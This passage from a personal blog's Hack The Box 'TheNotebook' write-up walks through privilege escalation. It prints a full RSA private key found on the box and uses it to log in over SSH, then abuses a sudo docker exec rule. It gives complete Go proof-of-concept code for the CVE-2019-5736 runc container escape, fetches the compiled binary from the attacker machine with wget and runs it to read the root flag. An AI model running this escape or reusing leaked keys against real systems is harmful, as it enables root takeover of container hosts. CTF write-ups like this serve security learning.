+</code></pre></div><p>When running linpeas it looks like its found an ssh private key for the user noah! Lets try and log in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">══════════╣ Analizing SSH FILES Files <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>                               
+-rw------- <span style="color:#ae81ff">1</span> www-data www-data <span style="color:#ae81ff">1679</span> Feb <span style="color:#ae81ff">17</span> 08:59 /tmp/home/noah/.ssh/id_rsa                                        
+-----BEGIN RSA PRIVATE KEY-----                                                                                    
+MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04                                                   
+HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT                                                   
+rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b                                                   
+HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD                                                   
+v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX                                                   
+rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
++UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
+Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h
+CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM
+Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce
+YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V
+AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/
+rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9
+0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU
+kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE
+vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X
+i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs
+QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
+VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
+vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr
+2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
+z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
+8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr
+JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
+Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ<span style="color:#f92672">=</span>
+-----END RSA PRIVATE KEY-----
+
+</code></pre></div><p>It worked!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents<span style="color:#f92672">]</span>
+└─$ ssh -i sshkey noah@10.10.10.230                                                                          <span style="color:#ae81ff">130</span> ⨯
+Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-135-generic x86_64<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jun <span style="color:#ae81ff">20</span> 23:24:56 UTC <span style="color:#ae81ff">2021</span>
+
+  System load:  0.01              Processes:              <span style="color:#ae81ff">194</span>
+  Usage of /:   40.0% of 7.81GB   Users logged in:        <span style="color:#ae81ff">1</span>
+  Memory usage: 18%               IP address <span style="color:#66d9ef">for</span> ens160:  10.10.10.230
+  Swap usage:   0%                IP address <span style="color:#66d9ef">for</span> docker0: 172.17.0.1
+
+
+<span style="color:#ae81ff">61</span> packages can be updated.
+<span style="color:#ae81ff">0</span> updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sun Jun <span style="color:#ae81ff">20</span> 23:17:45 <span style="color:#ae81ff">2021</span> from 10.10.15.23
+noah@thenotebook:~$ 
+
+
+</code></pre></div><p><code>sudo -l</code> returns something! It looks as though we can run docker exec on a specific container with root privileges. Lets get a shell on this container and see what we can do. If it&rsquo;s a privileged container we could do a docker escape and get root privileges on the host machine we have just come from.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noah@thenotebook:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> noah on thenotebook:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User noah may run the following commands on thenotebook:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+noah@thenotebook:~$ sudo docker exec -it webapp-dev01 bash
+root@0f4c2517af40:~# 
+</code></pre></div><p>So it looks like we can get into a docker container and we can run docker exec with sudo privileges. I found a great article that shows how we can exploit this [here] (<a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)</a>.</p>
+<p>The POC can be found [here] (<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a>)</p>
+<p>We can achieve this privilege escalation by overwriting and executing the host systems runc binary from within the container.</p>
+<p>We execute the /prov/self/exe file which is the hosts docker-runc binary. We are able to overwrite this binary which gives us our root privileges by changing some shared library like libc.so.</p>
+<p>Detailed steps:</p>
+<ul>
+<li>Make a binary that is likely to be overridden at runtime by the user (when we execute docker exec)) be a symlink to /proc/self/exe.</li>
+<li>Replace any dynamic library used by docker-runc with a custom .so</li>
+</ul>
+<h2 id="steps">Steps<a href="#steps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Step 1 is to alter the payload to grab what we want. I want the root.txt flag so i have changed the payload to cat the root.txt flag, save that to a file named 1 in the /tmp directory and then changed the permissions on it so i can read it after.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">package main
+
+import <span style="color:#f92672">(</span>
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
+	<span style="color:#e6db74">&#34;os&#34;</span>
+	<span style="color:#e6db74">&#34;strconv&#34;</span>
+	<span style="color:#e6db74">&#34;strings&#34;</span>
+<span style="color:#f92672">)</span>
+
+// This is the line of shell commands that will execute on the host
+var payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;#!/bin/bash \n cat /root/root.txt &gt; /tmp/1 &amp;&amp; chmod 777 /tmp/1&#34;</span>
+
+func main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
+	fd, err :<span style="color:#f92672">=</span> os.Create<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span><span style="color:#f92672">)</span>
+	<span style="color:#66d9ef">if</span> err !<span style="color:#f92672">=</span> nil <span style="color:#f92672">{</span>
+		fmt.Println<span style="color:#f92672">(</span>err<span style="color:#f92672">)</span>
+		<span style="color:#66d9ef">return</span>
+	<span style="color:#f92672">}</span>
+	fmt.Fprintln<span style="color:#f92672">(</span>fd, <span style="color:#e6db74">&#34;#!/proc/self/exe&#34;</span><span style="color:#f92672">)</span>
+	err <span style="color:#f92672">=</span> fd.Close<span style="color:#f92672">()</span>
+	<span style="color:#66d9ef">if</span> err !<span style="color:#f92672">=</span> nil <span style="color:#f92672">{</span>
+		fmt.Println<span style="color:#f92672">(</span>err<span style="color:#f92672">)</span>
+		<span style="color:#66d9ef">return</span>
+	<span style="color:#f92672">}</span>
+	fmt.Println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Overwritten /bin/sh successfully&#34;</span><span style="color:#f92672">)</span>
+
+	// Loop through all processes to find one whose cmdline includes runcinit
+	// This will be the process created by runc
+	var found int
+	<span style="color:#66d9ef">for</span> found <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">{</span>
+		pids, err :<span style="color:#f92672">=</span> ioutil.ReadDir<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/proc&#34;</span><span style="color:#f92672">)</span>
+		<span style="color:#66d9ef">if</span> err !<span style="color:#f92672">=</span> nil <span style="color:#f92672">{</span>
+			fmt.Println<span style="color:#f92672">(</span>err<span style="color:#f92672">)</span>
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#f92672">}</span>
+		<span style="color:#66d9ef">for</span> _, f :<span style="color:#f92672">=</span> range pids <span style="color:#f92672">{</span>
+			fbytes, _ :<span style="color:#f92672">=</span> ioutil.ReadFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/proc/&#34;</span> + f.Name<span style="color:#f92672">()</span> + <span style="color:#e6db74">&#34;/cmdline&#34;</span><span style="color:#f92672">)</span>
+			fstring :<span style="color:#f92672">=</span> string<span style="color:#f92672">(</span>fbytes<span style="color:#f92672">)</span>
+			<span style="color:#66d9ef">if</span> strings.Contains<span style="color:#f92672">(</span>fstring, <span style="color:#e6db74">&#34;runc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+				fmt.Println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Found the PID:&#34;</span>, f.Name<span style="color:#f92672">())</span>
+				found, err <span style="color:#f92672">=</span> strconv.Atoi<span style="color:#f92672">(</span>f.Name<span style="color:#f92672">())</span>
+				<span style="color:#66d9ef">if</span> err !<span style="color:#f92672">=</span> nil <span style="color:#f92672">{</span>
+					fmt.Println<span style="color:#f92672">(</span>err<span style="color:#f92672">)</span>
+					<span style="color:#66d9ef">return</span>
+				<span style="color:#f92672">}</span>
+			<span style="color:#f92672">}</span>
+		<span style="color:#f92672">}</span>
+	<span style="color:#f92672">}</span>
+
+	// We will use the pid to get a file handle <span style="color:#66d9ef">for</span> runc on the host.
+	var handleFd <span style="color:#f92672">=</span> -1
+	<span style="color:#66d9ef">for</span> handleFd <span style="color:#f92672">==</span> -1 <span style="color:#f92672">{</span>
+		// Note, you <span style="color:#66d9ef">do</span> not need to use the O_PATH flag <span style="color:#66d9ef">for</span> the exploit to work.
+		handle, _ :<span style="color:#f92672">=</span> os.OpenFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/proc/&#34;</span>+strconv.Itoa<span style="color:#f92672">(</span>found<span style="color:#f92672">)</span>+<span style="color:#e6db74">&#34;/exe&#34;</span>, os.O_RDONLY, 0777<span style="color:#f92672">)</span>
+		<span style="color:#66d9ef">if</span> int<span style="color:#f92672">(</span>handle.Fd<span style="color:#f92672">())</span> &gt; <span style="color:#ae81ff">0</span> <span style="color:#f92672">{</span>
+			handleFd <span style="color:#f92672">=</span> int<span style="color:#f92672">(</span>handle.Fd<span style="color:#f92672">())</span>
+		<span style="color:#f92672">}</span>
+	<span style="color:#f92672">}</span>
+	fmt.Println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Successfully got the file handle&#34;</span><span style="color:#f92672">)</span>
+
+	// Now that we have the file handle, lets write to the runc binary and overwrite it
+	// It will maintain it<span style="color:#960050;background-color:#1e0010">&#39;</span>s executable flag
+	<span style="color:#66d9ef">for</span> <span style="color:#f92672">{</span>
+		writeHandle, _ :<span style="color:#f92672">=</span> os.OpenFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/proc/self/fd/&#34;</span>+strconv.Itoa<span style="color:#f92672">(</span>handleFd<span style="color:#f92672">)</span>, os.O_WRONLY|os.O_TRUNC, 0700<span style="color:#f92672">)</span>
+		<span style="color:#66d9ef">if</span> int<span style="color:#f92672">(</span>writeHandle.Fd<span style="color:#f92672">())</span> &gt; <span style="color:#ae81ff">0</span> <span style="color:#f92672">{</span>
+			fmt.Println<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Successfully got write handle&#34;</span>, writeHandle<span style="color:#f92672">)</span>
+			writeHandle.Write<span style="color:#f92672">([]</span>byte<span style="color:#f92672">(</span>payload<span style="color:#f92672">))</span>
+			<span style="color:#66d9ef">return</span>
+		<span style="color:#f92672">}</span>
+	<span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+
+</code></pre></div><p>The next step is to compile this go file into an executeable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/Thenotebook/CVE-2019-5736-PoC<span style="color:#f92672">]</span>
+└─$ go build main.go   
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/Thenotebook/CVE-2019-5736-PoC<span style="color:#f92672">]</span>
+└─$ ls
+main  main.go  README.md  screenshots
+
+</code></pre></div><p>Once this is done we need to get the executeable onto the docker container</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@14a5ed8c3d32:/tmp# wget http://10.10.16.49/main /tmp
+--2021-06-27 21:39:02--  http://10.10.16.49/main
+Connecting to 10.10.16.49:80... connected.
+HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+Length: <span style="color:#ae81ff">2236814</span> <span style="color:#f92672">(</span>2.1M<span style="color:#f92672">)</span>
+Saving to: ‘main’
+
+main                         100%<span style="color:#f92672">[=============================================</span>&gt;<span style="color:#f92672">]</span>   2.13M  1017KB/s    in 2.1s    
+
+2021-06-27 21:39:04 <span style="color:#f92672">(</span><span style="color:#ae81ff">1017</span> KB/s<span style="color:#f92672">)</span> - ‘main’ saved <span style="color:#f92672">[</span>2236814/2236814<span style="color:#f92672">]</span>
+
+/tmp: Scheme missing.
+FINISHED --2021-06-27 21:39:04--
+Total wall clock time: 2.5s
+Downloaded: <span style="color:#ae81ff">1</span> files, 2.1M in 2.1s <span style="color:#f92672">(</span><span style="color:#ae81ff">1017</span> KB/s<span style="color:#f92672">)</span>
+root@14a5ed8c3d32:/tmp# chmod u+x main 
+</code></pre></div><p>From here we need to execute the file which should overwrite /bin/sh therefore we should be ready to run our <code>sudo docker exec </code> command to trigger our payload to be executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@14a5ed8c3d32:/tmp# ./main
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Overwritten /bin/sh successfully
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found the PID: <span style="color:#ae81ff">98</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully got the file handle
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully got write handle &amp;<span style="color:#f92672">{</span>0xc00004c540<span style="color:#f92672">}</span>
+noah@thenotebook:~$ 
+
+</code></pre></div><p>here we are running the docker exec command and getting the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+No help topic <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;/bin/sh&#39;</span>
+noah@thenotebook:~$ ls /tmp
+<span style="color:#ae81ff">1</span>      systemd-private-f25b770f780744bd9d28e10a2b429022-systemd-timesyncd.service-khoHWO
+luffy  vmware-root_611-3980232955
+noah@thenotebook:~$ cat /tmp/1
+e58a269bcb5c4019616911b2c69ab6c2
+</code></pre></div><p><img src="/images/privesc.png" alt="privesc"></p>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
